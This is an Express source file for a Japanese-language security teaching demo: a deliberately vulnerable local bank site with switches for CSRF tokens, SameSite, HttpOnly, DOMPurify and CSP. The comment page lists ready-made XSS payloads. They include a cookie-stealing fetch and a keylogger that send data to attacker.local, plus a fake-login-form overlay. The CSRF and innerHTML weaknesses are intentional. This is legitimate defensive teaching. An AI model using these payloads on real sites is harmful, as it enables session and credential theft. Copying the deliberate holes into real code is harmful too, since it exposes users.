// bank.local:3000
const express = require('express')
const crypto = require('crypto')
const path = require('path')

const app = express()
app.use(express.urlencoded({ extended: true }))
app.use(express.static(path.join(__dirname, 'public')))

// --- In-memory state ---
const sessions = {}
const comments = []
let csrfProtection = true
let sameSite = 'lax'
let xssProtection = false  // false = innerHTML（危険）, true = DOMPurify（安全）
let cspEnabled = false     // true = Content-Security-Policy ヘッダーを付与
let httpOnly = true        // false = JSからCookieが読める

// --- CSP middleware ---
// nonce を生成して res.locals に保存し、正規のインラインスクリプトだけ許可する
app.use((req, res, next) => {
  if (cspEnabled) {
    const nonce = crypto.randomBytes(16).toString('base64')
    res.locals.nonce = nonce
    res.setHeader('Content-Security-Policy', `script-src 'self' 'nonce-${nonce}'`)
  } else {
    res.locals.nonce = ''
  }
  next()
})

// --- Helpers ---
function getSession(req) {
  const raw = req.headers.cookie || ''
  const cookies = Object.fromEntries(
    raw.split(';').filter(Boolean).map(c => c.trim().split('='))
  )
  return sessions[cookies.session]
}

function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}

function setCookieHeader(sessionId) {
  const flags = [
    `session=${sessionId}`,
    httpOnly ? 'HttpOnly' : '',
    `SameSite=${sameSite}`,
    'Path=/',
  ].filter(Boolean).join('; ')
  return flags
}

// --- Routes ---

app.get('/', (req, res) => {
  const session = getSession(req)
  const flash = session?._flash || null
  if (session) delete session._flash
  res.send(session ? dashboard(session, flash, res.locals.nonce) : loginPage())
})

app.post('/login', (req, res) => {
  const { username, password } = req.body
  if (password !== 'pass') return res.send('パスワードが違います')
  const sessionId = crypto.randomBytes(16).toString('hex')
  const csrfToken = crypto.randomBytes(16).toString('hex')
  sessions[sessionId] = { username, balance: 10000, csrfToken, log: [] }
  res.setHeader('Set-Cookie', setCookieHeader(sessionId))
  res.redirect('/')
})

app.post('/transfer', (req, res) => {
  const session = getSession(req)
  if (!session) {
    return res.status(401).send(`
      <div style="padding:60px;font-family:sans-serif;text-align:center">
        <h2 style="color:#27ae60">✅ SameSite=strict が効いています</h2>
        <p>別サイトからのリクエストにCookieが付かないため、未ログイン扱いになりました。</p>
        <a href="/">戻る</a>
      </div>`)
  }

  const { to, amount, csrf_token } = req.body

  if (csrfProtection && csrf_token !== session.csrfToken) {
    session._flash = { type: 'blocked', msg: `CSRFトークン不一致 → ${to} への ¥${amount} をブロックしました` }
    session.log.push(`🛡️ 送金ブロック → ${to} へ ¥${amount}（CSRFトークン不一致）`)
    return res.redirect('/')
  }

  const amt = parseInt(amount)
  session.balance -= amt
  session._flash = { type: 'danger', msg: `¥${amt.toLocaleString()} が ${to} に送金されました（攻撃成功）` }
  session.log.push(`💸 送金完了 → ${to} へ ¥${amt}`)
  res.redirect('/')
})

app.post('/comments', (req, res) => {
  comments.push(req.body.comment || '')
  res.redirect('/')
})

app.get('/comments', (req, res) => res.send(commentsPage(res.locals.nonce)))

// --- Toggle routes ---
app.get('/toggle-csrf',     (req, res) => { csrfProtection = !csrfProtection; res.redirect('/') })
app.get('/toggle-xss',      (req, res) => { xssProtection = !xssProtection; res.redirect('/') })
app.get('/toggle-csp',      (req, res) => { cspEnabled = !cspEnabled; res.redirect('/') })
app.get('/toggle-samesite', (req, res) => {
  sameSite = sameSite === 'strict' ? 'lax' : 'strict'
  res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
  res.redirect('/')
})
app.get('/toggle-httponly', (req, res) => {
  httpOnly = !httpOnly
  res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/')
  res.redirect('/')
})

app.get('/reset-comments', (req, res) => { comments.length = 0; res.redirect('/') })
app.get('/logout',  (req, res) => { res.setHeader('Set-Cookie', 'session=; Max-Age=0; Path=/'); res.redirect('/') })
app.get('/reset',   (req, res) => {
  const session = getSession(req)
  if (session) { session.balance = 10000; session.log = [] }
  res.redirect('/')
})

// --- HTML ---

function css() {
  return `<style>
    * { box-sizing: border-box; }
    body { font-family: sans-serif; background: #f0f2f5; margin: 0; padding-bottom: 60px; }
    .wrap { max-width: 860px; margin: 32px auto; background: white; padding: 32px; border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
    h1 { margin: 0 0 4px; font-size: 22px; }
    .sub { color: #888; font-size: 13px; margin-bottom: 24px; }
    input, textarea { display: block; width: 100%; margin: 6px 0 12px; padding: 9px 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
    button, .btn { background: #2c3e50; color: white; border: none; padding: 9px 18px; border-radius: 6px; cursor: pointer; font-size: 14px; text-decoration: none; display: inline-block; }
    button:hover, .btn:hover { background: #34495e; }
    .btn-sm { font-size: 12px; padding: 4px 12px; margin-left: 8px; background: #7f8c8d; border-radius: 4px; color: white; text-decoration: none; display: inline-block; }
    .panel { border: 2px solid #e9ecef; border-radius: 8px; margin: 20px 0; overflow: hidden; }
    .panel-head { background: #f8f9fa; padding: 12px 16px; font-weight: bold; font-size: 14px; border-bottom: 1px solid #e9ecef; }
    .panel-body { padding: 12px 16px; }
    .row { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
    .row:last-child { border-bottom: none; }
    .row-label { flex: 1; }
    .row-note { font-size: 12px; color: #666; margin-top: 3px; }
    .tag-on  { background: #d4edda; color: #155724; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; white-space: nowrap; }
    .tag-off { background: #f8d7da; color: #721c24; padding: 2px 10px; border-radius: 12px; font-size: 13px; font-weight: bold; white-space: nowrap; }
    .flash { padding: 14px 18px; border-radius: 8px; margin-bottom: 20px; font-size: 15px; font-weight: bold; }
    .flash-danger  { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    .flash-blocked { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
    .comment-item { border-left: 3px solid #ddd; padding: 6px 10px; margin: 5px 0; font-size: 14px; border-radius: 0 4px 4px 0; background: #fafafa; }
    .preset code { background: #1e1e1e; color: #d4d4d4; padding: 8px 12px; border-radius: 6px; font-size: 12px; display: block; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }
    .preset p { margin: 12px 0 4px; font-size: 13px; font-weight: bold; }
    .note { font-size: 12px; color: #888; font-weight: normal; }
    .balance { font-size: 28px; font-weight: bold; color: #2c3e50; }
    code { background: #f0f0f0; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
    ul { padding-left: 20px; }
    li { margin: 4px 0; font-size: 14px; }
    hr { border: none; border-top: 1px solid #eee; margin: 24px 0; }
    .footer-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #2c3e50; color: #ccc; padding: 10px 24px; font-size: 13px; }
    .footer-bar a { color: #5dade2; }
    .section-title { font-size: 15px; font-weight: bold; margin: 24px 0 8px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
    .badge { font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: normal; white-space: nowrap; }
    .badge-danger { background: #f8d7da; color: #721c24; }
    .badge-safe   { background: #d4edda; color: #155724; }
  </style>`
}

function loginPage() {
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank（victim）</title>${css()}</head><body>
<div class="wrap">
  <h1>🏦 bank.local</h1>
  <p class="sub">port 3000 — 被害者サイト（銀行）</p>
  <p>ユーザー名：何でもOK ／ パスワード：<strong>pass</strong></p>
  <form method="POST" action="/login">
    <input name="username" value="alice" placeholder="ユーザー名">
    <input name="password" type="password" value="pass" placeholder="パスワード">
    <button type="submit">ログイン</button>
  </form>
</div>
</body></html>`
}

function dashboard(session, flash, nonce) {
  const nonceAttr = nonce ? ` nonce="${nonce}"` : ''
  const demoData = JSON.stringify({ comments: comments.slice(-5), xssProtection })

  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>Bank Dashboard</title>${css()}</head><body>
<div class="wrap">
  <h1>🏦 bank.local</h1>
  <p class="sub">port 3000 — ${escapeHtml(session.username)} さんがログイン中</p>

  ${flash ? `<div class="flash flash-${flash.type}">${flash.type === 'blocked' ? '🛡️' : '💀'} ${escapeHtml(flash.msg)}</div>` : ''}

  <p>残高 <span class="balance" id="balance">¥${session.balance.toLocaleString()}</span>
    <a href="/reset" class="btn-sm">残高リセット</a>
  </p>

  <!-- 対策パネル -->
  <div class="panel">
    <div class="panel-head">🛡️ 対策パネル — ON/OFF を切り替えて攻撃の成否を確認する</div>
    <div class="panel-body">

      <div class="row">
        <div class="row-label">
          <div>XSS保護（DOMPurify）</div>
          <div class="row-note">${xssProtection
            ? '✅ ON — DOMPurify.sanitize() でコメントを無害化。onerrorなどを除去しつつHTMLは残す'
            : '❌ OFF — コメントをそのまま innerHTML に挿入（v-html 相当）'}</div>
        </div>
        <span class="${xssProtection ? 'tag-on' : 'tag-off'}">${xssProtection ? 'ON' : 'OFF'}</span>
        <a href="/toggle-xss" class="btn-sm">切り替え</a>
      </div>

      <div class="row">
        <div class="row-label">
          <div>CSP（Content Security Policy）</div>
          <div class="row-note">${cspEnabled
            ? '✅ ON — script-src \'self\' で外部・インラインスクリプトの実行をブロック。多層防御の2段目'
            : '❌ OFF — スクリプト実行の制限なし'}</div>
        </div>
        <span class="${cspEnabled ? 'tag-on' : 'tag-off'}">${cspEnabled ? 'ON' : 'OFF'}</span>
        <a href="/toggle-csp" class="btn-sm">切り替え</a>
      </div>

      <div class="row">
        <div class="row-label">
          <div>HttpOnly Cookie</div>
          <div class="row-note">${httpOnly
            ? '✅ ON — document.cookie でCookieを読めない。ペイロード④でも盗めない'
            : '❌ OFF — document.cookie でCookieが読める。ペイロード④でattackerのターミナルに表示される'}</div>
        </div>
        <span class="${httpOnly ? 'tag-on' : 'tag-off'}">${httpOnly ? 'ON' : 'OFF'}</span>
        <a href="/toggle-httponly" class="btn-sm">切り替え（再ログイン）</a>
      </div>

      <div class="row">
        <div class="row-label">
          <div>CSRFトークン</div>
          <div class="row-note">${csrfProtection
            ? '✅ ON — 秘密値を照合。別サイトからの偽造リクエストをブロック'
            : '❌ OFF — トークン検証なし。attacker.local からの送金が通る'}</div>
        </div>
        <span class="${csrfProtection ? 'tag-on' : 'tag-off'}">${csrfProtection ? 'ON' : 'OFF'}</span>
        <a href="/toggle-csrf" class="btn-sm">切り替え</a>
      </div>

      <div class="row">
        <div class="row-label">
          <div>SameSite Cookie</div>
          <div class="row-note">${sameSite === 'strict'
            ? '✅ strict — 別サイトからのリクエストにCookieを付けない。未ログイン扱いになる'
            : '⚠️ lax — GETリンク遷移にはCookieを付ける。fetch/POSTには付けない'}</div>
        </div>
        <span class="${sameSite === 'strict' ? 'tag-on' : 'tag-off'}">${sameSite}</span>
        <a href="/toggle-samesite" class="btn-sm">切り替え（再ログイン）</a>
      </div>

    </div>
  </div>

  <!-- 送金フォーム（CSRF対象） -->
  <div class="section-title">送金フォーム <span class="badge badge-danger">← CSRFの標的</span></div>
  <form method="POST" action="/transfer" style="display:flex;gap:8px;align-items:flex-end">
    <div style="flex:1"><input name="to" placeholder="送金先口座" style="margin:0"></div>
    <div style="width:120px"><input name="amount" type="number" value="3000" style="margin:0"></div>
    ${csrfProtection ? `<input type="hidden" name="csrf_token" value="${session.csrfToken}">` : ''}
    <button type="submit" style="white-space:nowrap">送金する</button>
  </form>

  ${session.log.length ? `
  <div style="margin-top:12px">
    <ul style="margin:0">${session.log.slice(-5).map(l => `<li>${escapeHtml(l)}</li>`).join('')}</ul>
  </div>` : ''}

  <!-- コメント欄（XSS着弾点） -->
  <div class="section-title">
    最新コメント
    <span class="badge ${xssProtection ? 'badge-safe' : 'badge-danger'}">${xssProtection ? '✅ DOMPurify（安全）' : '❌ innerHTML（XSS着弾点）'}</span>
    <a href="/reset-comments" class="btn-sm" style="margin-left:auto">コメントクリア</a>
  </div>
  <div id="comments-area"><p style="color:#aaa;font-size:13px">読み込み中...</p></div>
  <div style="margin-top:12px">
    <a href="/comments" class="btn">💬 コメントを投稿する（XSSデモ）</a>
    <a href="/logout" class="btn-sm">ログアウト</a>
  </div>

</div>
<div class="footer-bar">
  CSRFを試すには → <a href="http://attacker.local:3001" target="_blank">attacker.local:3001（攻撃者サイト）</a> を開く
</div>

<!-- コメントデータをDOMに埋め込む（nonce付きで正規スクリプトとして許可） -->
<script${nonceAttr}>window.__DEMO_DATA__ = ${demoData};</script>
<script src="/purify.min.js"></script>
<script src="/client.js"></script>
</body></html>`
}

function commentsPage(nonce) {
  const nonceAttr = nonce ? ` nonce="${nonce}"` : ''
  return `<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8"><title>コメント投稿（XSSデモ）</title>${css()}</head><body>
<div class="wrap">
  <h1>💬 コメントを投稿する</h1>
  <p class="sub">投稿するとダッシュボードに戻ります。仕込んだコードが <strong>銀行の画面で</strong> 実行されます。</p>

  <form method="POST" action="/comments">
    <textarea name="comment" rows="3" placeholder="ペイロードをここに貼り付けて投稿..."></textarea>
    <button type="submit">投稿してダッシュボードへ</button>
  </form>

  <div class="preset">
    <p>① アラートを出す（動作確認）</p>
    <code>&lt;img src=x onerror="alert('XSS: bank.local で実行されました')"&gt;</code>

    <p>② 残高を書き換える</p>
    <code>&lt;img src=x onerror="document.getElementById('balance').textContent='¥0'"&gt;</code>

    <p>③ 画面を偽のログインフォームで乗っ取る</p>
    <code>&lt;img src=x onerror="document.body.innerHTML='&lt;div style=padding:80px;text-align:center;font-family:sans-serif&gt;&lt;h2&gt;セッションが切れました&lt;/h2&gt;&lt;p&gt;再度ログインしてください&lt;/p&gt;&lt;input placeholder=ユーザー名 style=display:block;margin:8px auto;padding:8px;width:220px&gt;&lt;input type=password placeholder=パスワード style=display:block;margin:8px auto;padding:8px;width:220px&gt;&lt;button style=padding:8px 24px&gt;ログイン&lt;/button&gt;&lt;/div&gt;'"&gt;</code>

    <p>④ CookieをattackerのサーバーにHTTPで送信する <span class="note">— 対策パネルで HttpOnly を切り替えて試す</span></p>
    <code>&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>

    <p>⑤ キーロガー（入力内容をattackerに送信） <span class="note">— 投稿後、ダッシュボードの入力欄でタイプするとattackerのターミナルに表示される</span></p>
    <code>&lt;img src=x onerror="document.addEventListener('keydown',e=&gt;fetch('http://attacker.local:3001/stolen?key='+e.key))"&gt;</code>

    <p style="margin-top:16px;color:#27ae60;font-size:13px">対策を試すには：ダッシュボードに戻り「XSS保護 ON」または「CSP ON」に切り替えてから同じペイロードを再投稿する</p>
  </div>

  <a href="/">← ダッシュボードへ戻る</a>
</div>
</body></html>`
}

app.listen(3000, () => {
  console.log('victim (bank): http://bank.local:3000')
})
